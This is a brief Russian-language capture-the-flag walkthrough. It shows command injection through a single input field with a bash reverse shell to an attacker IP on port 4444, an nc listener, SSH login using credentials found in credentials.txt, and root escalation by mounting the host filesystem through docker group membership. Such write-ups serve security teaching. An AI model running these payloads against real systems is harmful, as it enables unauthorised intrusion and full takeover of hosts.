1) У нас есть единственное поле ввода, можно попробовать инъецировать какую-то команду:
'; bash -c 'bash -i >& /dev/tcp/<Your IP>/4444 0>&1'; '
В это время слушая на другой машине порт:
nc -l 4444
В итоге получаем Reverse Shell
2) Посмотрев, что есть, можно заметить файл credentials.txt с кредами каких-то пользователей
Попробуем подключиться по ssh к какому-нибудь
Получилось с ctfplayer => Забираем флаг user.txt
3) Проверяем группы, к которым принадлежит пользователь и видим, что есть группа docker
4) Можно воспользоваться докером, монтировав систему с корневым каталогом:
docker run -it --privileged --pid=host --net=host --ipc=host -v /:/hostroot alpine:latest chroot /hostroot /bin/bash
5) Получаем доступ к /root и забираем флаг root.txt
